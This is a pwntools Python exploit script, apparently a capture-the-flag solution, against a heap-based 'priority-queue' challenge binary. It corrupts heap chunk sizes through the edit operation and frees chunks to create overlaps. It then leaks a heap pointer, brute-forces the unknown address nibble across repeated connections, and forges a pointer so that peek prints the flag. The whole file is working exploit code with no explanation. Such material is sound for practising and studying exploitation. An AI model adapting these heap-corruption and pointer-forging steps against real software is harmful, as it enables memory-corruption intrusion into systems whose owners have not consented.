#!/usr/bin/env python3
from pwn import *
import sys

HOST = "priority-queue.opus4-7.b01le.rs"
PORT = 8443
exe = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

PROMPT = b"Operation (insert/delete/peek/edit/count/quit): \n"
MSG = b"Message: \n"

FLAG_OFFSET = 0x480
LEAK_PREFIX = 0x94F0
REMOTE = 'r' in sys.argv[1:]


def GDB():
    if not REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x0000000000001806
            c
            set follow-fork-mode parent
            ''')


def start():
    if REMOTE:
        p = remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        p = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chall"])
    p.recvuntil(PROMPT)
    return p


def recv_prompt(p):
    p.recvuntil(PROMPT)


def insert(p, data):
    p.sendline(b"insert")
    p.recvuntil(MSG)
    p.sendline(data)
    recv_prompt(p)


def edit(p, data):
    p.sendline(b"edit")
    p.recvuntil(MSG)
    p.send(data)
    recv_prompt(p)


def delete(p):
    p.sendline(b"delete")
    return p.recvuntil(PROMPT, drop=True)


def peek(p):
    p.sendline(b"peek")
    return p.recvuntil(PROMPT, drop=True)


def heap_leak(p):
    insert(p, b"a")
    insert(p, b"b")
    insert(p, b"c")
    insert(p, b"\xff")

    edit(p, b"A" * 0x18 + b"\x41")
    delete(p)
    delete(p)
    delete(p)

    insert(p, b"y" * 0x20 + b"QQQQQQ")
    insert(p, b"\xff")
    delete(p)

    edit(p, p16(LEAK_PREFIX))
    data = peek(p).rstrip(b"\n")

    leak = data[:6]
    log.info("heap_leak: " + hex(u64(leak.ljust(8, b'\0'))))
    heap_hi = u32(leak[2:6])
    return leak, heap_hi


def leak_flag(p, flag_ptr):
    for ch in b"mnopqrsz":
        insert(p, bytes([ch]))

    for _ in range(5):
        delete(p)

    edit(p, b"R" * 0x18 + b"\x31")
    delete(p)
    delete(p)

    payload = b"\x90" * 32 + p64(flag_ptr)[:6]
    insert(p, payload)
    return peek(p)


def attempt(nibble):
    p = start()
    try:
        leak, heap_hi = heap_leak(p)
        heap_base = (heap_hi << 16) | (nibble << 12)
        flag_ptr = heap_base + FLAG_OFFSET

        log.info(
            "leak=%r heap_hi=%#x nibble=%#x heap_base=%#x flag_ptr=%#x",
            leak,
            heap_hi,
            nibble,
            heap_base,
            flag_ptr,
        )

        data = leak_flag(p, flag_ptr)
        return data
    finally:
        p.close()


context.log_level = "debug" if args.D else "info"
N = int(args.N, 0) if args.N else None
R = int(args.R, 0) if args.R else 4

if N is not None:
    data = attempt(N)
    sys.stdout.buffer.write(data)
    if not data.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    raise SystemExit(0)

for round_id in range(R):
    for nibble in range(0x10):
        try:
            data = attempt(nibble)
            log.info("round=%d nibble=%#x -> %r", round_id, nibble, data)
            if b"{" in data:
                sys.stdout.buffer.write(data)
                if not data.endswith(b"\n"):
                    sys.stdout.buffer.write(b"\n")
                raise SystemExit(0)
        except EOFError:
            log.info("round=%d nibble=%#x crashed", round_id, nibble)
        except Exception as e:
            log.info("round=%d nibble=%#x failed: %s", round_id, nibble, e)

raise SystemExit(1)
